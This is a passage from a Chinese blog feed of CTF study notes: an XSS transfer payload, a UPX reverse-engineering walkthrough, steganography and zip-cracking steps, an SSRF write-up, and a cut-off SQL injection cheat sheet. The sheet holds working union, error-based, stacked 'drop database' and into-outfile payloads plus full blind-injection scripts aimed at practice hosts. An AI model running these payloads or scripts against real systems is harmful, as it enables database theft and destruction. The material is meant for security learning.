class="line"></span><br></pre></td></tr></table></figure><p>经过测试可以，格式化一下变成payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/amount.php&#x27;,type:&#x27;post&#x27;,data:&#123;u:&#x27;123&#x27;,a:&#x27;10000&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281948150.png" alt="image-20250428194801120" loading="lazy"></p><p>转账成功，😎</p><p>购买flag</p><p>转载：<a href="https://blog.csdn.net/qq_56815564/article/details/131563596">https://blog.csdn.net/qq_56815564/article/details/131563596</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;反射型-非持久化&quot;&gt;&lt;a href=&quot;#反射型-非持久化&quot; class=&quot;headerlink&quot; title=&quot;反射型(非持久化)&quot;&gt;&lt;/a&gt;反射型(非持久化)&lt;/h3&gt;&lt;p&gt;（1）原理&lt;br&gt;  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="xss" scheme="https://kinseyy.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>re</title>
    <link href="https://kinseyy.github.io/2025/04/20/re/"/>
    <id>https://kinseyy.github.io/2025/04/20/re/</id>
    <published>2025-04-20T06:19:03.000Z</published>
    <updated>2025-04-20T06:40:00.100Z</updated>
    
    <content type="html"><![CDATA[<h3 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h3><p>我们先进行查壳</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201429029.png" alt="image-20250420142946865" loading="lazy"></p><p>发现存在一个UPX壳</p><p><a href="https://www.cnblogs.com/bonelee/p/16407794.html">UPX的介绍</a></p><p>如果我们直接放到ida中分析</p><p>此处就只有两个函数</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201433019.png" alt="image-20250420143330951" loading="lazy"></p><p>我们使用软件进行脱壳</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201434692.png" alt="image-20250420143415623" loading="lazy"></p><p>把脱壳后的文件放入ida进行分析</p><p>Shif+F12查看字符串（找到关键词） </p><p>再用ctrl+f查找flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201435043.png" alt="image-20250420143542974" loading="lazy"></p><p>我们双击该字符串找到它对应的位置</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201436958.png" alt="image-20250420143621811" loading="lazy"></p><p>双击引用该字符串的位置，进入到流程图</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201438129.png" alt="image-20250420143851028" loading="lazy"></p><p> 直接按F5查看伪代码</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504201439067.png" alt="image-20250420143901999" loading="lazy"></p><p>分析代码</p><p>flag为flag{HappyNewYear!}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;新年快乐&quot;&gt;&lt;a href=&quot;#新年快乐&quot; class=&quot;headerlink&quot; title=&quot;新年快乐&quot;&gt;&lt;/a&gt;新年快乐&lt;/h3&gt;&lt;p&gt;我们先进行查壳&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://insey.oss-cn-shenzhen.aliyunc</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>misc</title>
    <link href="https://kinseyy.github.io/2025/04/18/misc/"/>
    <id>https://kinseyy.github.io/2025/04/18/misc/</id>
    <published>2025-04-18T11:27:01.000Z</published>
    <updated>2025-04-20T06:19:24.433Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>打开我们发现是个二维码，我们用QRReasearch进行扫描</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181928743.png" alt="image-20250418192834634" loading="lazy"></p><p>提示这个图片里有秘密</p><p>由于附件中只有一张二维码，而且刚才的提示信息secret is here 表明flag确实在这里，于是想到可能在图片中可能隐藏了其他文件。隐藏原理如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">一个完整的 JPG 文件由 FF D8 开头，FF D9结尾</span><br><span class="line">图片浏览器会忽略 FF D9 以后的内容，因此可以在 JPG 文件中加入其他文件。</span><br><span class="line">其余同理：</span><br><span class="line">png</span><br><span class="line">十进制数137 80 78 71 13 10 26 10</span><br><span class="line">十六进制数 89 50 4e 47 0d 0a 1a 0a</span><br><span class="line">gif</span><br><span class="line">图像开始标志：47 49 46 38 39 61  </span><br><span class="line">结束标志：01 01 00 3B</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在kail中打开图片，发现有个4number.txt</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181929733.png" alt="image-20250418192950695" loading="lazy"></p><p>我们用binwalk进行检测</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181930051.png" alt="image-20250418193005025" loading="lazy"></p><p>下一步用foremost进行分离</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181931628.png" alt="image-20250418193102602" loading="lazy"></p><p>分离后解压zip文件需要密码，根据提示密码为4位数</p><p>我们直接zip爆破</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181935874.png" alt="image-20250418193537846" loading="lazy"></p><p>密码为7631，打开就能得到flag</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181936638.png" alt="image-20250418193650588" loading="lazy"></p><p>图片打开长这样，我们需要修改它的高</p><p>放010里打开</p><p>图片放在010 Editor，修改图片宽高。我们来分析png文件格式，</p><p>首先，“89 50 4E 47 0D 0A 1A 0A”为标识png文件的八个字节的文件头标志。</p><p>然后是IHDR数据块，</p><p>“00 00 00 0D”说明IHDR头块长为13</p><p>”49 48 44 52“为IHDR标识（ASCII码为IHDR）</p><p>“00 00 02 A7”为图像的宽，24像素</p><p>”00 00 01 00“为图像的高，24像素<br><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181938654.png" alt="image-20250418193821619" loading="lazy"><br>将00 00 01 00改为00 00 04 00，得到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181938586.png" alt="image-20250418193858545" loading="lazy"></p><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><p>根据提示过滤出POST包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504181944512.png" alt="image-20250418194451475" loading="lazy"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;二维码&quot;&gt;&lt;a href=&quot;#二维码&quot; class=&quot;headerlink&quot; title=&quot;二维码&quot;&gt;&lt;/a&gt;二维码&lt;/h2&gt;&lt;p&gt;打开我们发现是个二维码，我们用QRReasearch进行扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://insey.oss-</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://kinseyy.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>[HNCTF 2022 WEEK2]ez_ssrf</title>
    <link href="https://kinseyy.github.io/2025/04/15/HNCTF-2022-WEEK2-ez-ssrf/"/>
    <id>https://kinseyy.github.io/2025/04/15/HNCTF-2022-WEEK2-ez-ssrf/</id>
    <published>2025-04-15T07:25:27.000Z</published>
    <updated>2025-04-15T07:40:14.525Z</updated>
    
    <content type="html"><![CDATA[<h4 id="HNCTF-2022-WEEK2-ez-ssrf"><a href="#HNCTF-2022-WEEK2-ez-ssrf" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf"></a>[HNCTF 2022 WEEK2]ez_ssrf</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到fsockopen函数，就知道这题一个是个ssrf的题</p><p>先审计代码</p><p>首先通过fsockopen()函数建立与指定主机和端口的socker连接，然后它将传入的数据进行base64解码，然后将数据写入到连接的socket中</p><p>我们构造http头来访问&#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p>进行base64加密，连接本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;HNCTF-2022-WEEK2-ez-ssrf&quot;&gt;&lt;a href=&quot;#HNCTF-2022-WEEK2-ez-ssrf&quot; class=&quot;headerlink&quot; title=&quot;[HNCTF 2022 WEEK2]ez_ssrf&quot;&gt;&lt;/a&gt;[HNCTF 2022 W</summary>
      
    
    
    
    <category term="刷题笔记" scheme="https://kinseyy.github.io/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ssrf" scheme="https://kinseyy.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="https://kinseyy.github.io/2025/04/02/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>https://kinseyy.github.io/2025/04/02/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2025-04-02T11:11:45.000Z</published>
    <updated>2025-04-13T08:09:25.706Z</updated>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>sql注入发生原理：</p><p>用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库</p><h4 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h4><p>常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入……</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p><strong>1.判断显示位</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=SELECT first name, last_name FROM users WHERE user_id = &#x27;1&#x27; union select 1,2,3#;</span><br></pre></td></tr></table></figure><p><strong>2.爆数据库的名字</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;1&#x27; union select 1,user(),database()--+‘；</span><br></pre></td></tr></table></figure><p><strong>3.爆数据库中的表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&#x27;;</span><br></pre></td></tr></table></figure><p><strong>4.爆表中的字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= &#x27;-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+&#x27;，</span><br></pre></td></tr></table></figure><p> <strong>5.爆相应字段的所有数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = &#x27;-1&#x27; union select 1,2,group_concat(user,password) from users--+&#x27;;</span><br></pre></td></tr></table></figure><h3 id="盲注脚本"><a href="#盲注脚本" class="headerlink" title="盲注脚本"></a>盲注脚本</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    url = <span class="string">&#x27;http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/&#x27;</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">            <span class="comment">#payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">            <span class="comment">#payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagba&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">            payload = <span class="string">f&#x27;if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;uname&quot;</span>:<span class="string">f&quot;admin&#x27; and <span class="subst">&#123;payload&#125;</span>#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;passwd&quot;</span>:<span class="number">12346</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = requests.post(url=url,data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;flag.jpg&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">        <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    url = <span class="string">&#x27;http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1&quot;%20and%20&#x27;</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = f&#x27;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(3))%23&#x27;</span></span><br><span class="line">            <span class="comment">#payload = f&#x27;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span></span><br><span class="line">            <span class="comment">#payload = f&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;flagugs&quot;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,sleep(2))%23&#x27;</span></span><br><span class="line">            payload = <span class="string">f&#x27;if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,sleep(2))%23&#x27;</span></span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            stime=time.time()</span><br><span class="line">            r = requests.get(url=url + payload)</span><br><span class="line">            <span class="keyword">if</span> time.time()-stime&lt;<span class="number">2</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">        <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="注入类型-1"><a href="#注入类型-1" class="headerlink" title="注入类型"></a>注入类型</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>其产生原因是：服务器端虽然对用户的直接输入做了一些过滤或者将一些字符进行转义，但是对于已经存入数据库的信息是完全信任的，即：不校验数据库信息是否合法</p><p>利用场景主要有：靶机里同时存在注册和登录页面，且需要获得admin密码</p><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作</p><p>通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。因此当我们输入’时，在php代码中如果有过滤的话会利用转义字符\进行转义，而利用urlencode表示的话，就为%5c%27，我们若想要将%5c去掉，则若此时mysql用的是GBK编码，则可以在前面加上一个编码如**%df**，使得系统认定%df%5c表示着一个汉字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="operator">%</span>df<span class="string">&#x27;users %df&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>使用前提：堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如 <strong>mysqli_multi_query()</strong> 函数就支持多条SQL语句同时执行，而 mysqli_query() 函数就不支持。在实际应用中，大多数都使用的是 <strong>mysqli_query()</strong> 函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用 mysqli_query() 函数。</p><p>利用方式:在我们输入的语句后面加上分号表示该语句结束，之后再输入另一条语句就可以了。例如可以先写一个查询语句，之后加分号表示查询结束，再在分号后输入删除语句。这样就叫堆叠注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=show database();drop database &lt;数据库名&gt;;</span><br></pre></td></tr></table></figure><h4 id="文件读取写入注入"><a href="#文件读取写入注入" class="headerlink" title="文件读取写入注入"></a>文件读取写入注入</h4><h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p><code>union select 1,2,load_file(&#39;文件路径&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,load_file(&#x27;D:/test.txt&#x27;)</span><br><span class="line">?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)</span><br><span class="line"> （%20是换行，%27是引号，有路径时，防止转义可以将\改为\\或者/）</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h5><p><strong><code>union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &#39;文件路径&#39; --+</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;&lt;?php phpinfo();?&gt;&#x27;,3 into outfile &#x27;E:\\phpStudy\\WWW\\sqli\\Less-7\\1.php&#x27; --+</span><br><span class="line">此时就将 phpinfo() 的内容写入 E:\phpStudy\WWW\sqli\Less-7 路径下并创建一个1.php文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><strong>updatexml（）函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆出数据库</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,database(),0x7er),1)#</span><br><span class="line"></span><br><span class="line">爆当前数据库表信息</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆user表字段信息</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;users&#x27;),0x7e),1) #</span><br><span class="line"></span><br><span class="line">爆数据库内容、、</span><br><span class="line">1&#x27; and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #</span><br></pre></td></tr></table></figure><p>extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">爆出数据库</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,user(),0x7e,database())) #</span><br><span class="line"></span><br><span class="line">爆当前数据库表信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #</span><br><span class="line"></span><br><span class="line">爆user表字段信息</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))) #</span><br><span class="line"></span><br><span class="line">爆数据库内容、、</span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="handler命令注入"><a href="#handler命令注入" class="headerlink" title="handler命令注入"></a>handler命令注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,…) [ <span class="keyword">WHERE</span> where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125; [ <span class="keyword">WHERE</span> where_condition ] [LIMIT … ]</span><br><span class="line">HANDLER tbl_name READ &#123; <span class="keyword">FIRST</span> 